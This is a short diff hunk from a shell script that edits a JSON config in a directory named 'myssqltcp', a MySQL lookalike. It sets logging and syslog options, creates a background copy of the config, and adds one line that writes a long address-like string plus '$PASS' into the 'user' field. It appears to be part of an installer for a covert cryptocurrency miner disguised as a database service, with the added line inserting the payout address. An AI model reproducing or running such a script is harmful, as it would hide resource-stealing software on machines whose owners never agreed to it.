@@ -736,6 +736,7 @@ sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssql
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
 
 cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
+sed -i 's/"user": *"[^"]*",/"user": "NHbMF1kvm9uorYcdGh8mr7Tfw99Gvo21QCYu.'$PASS'",/' $HOME/myssqltcp/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json
 
 # preparing script
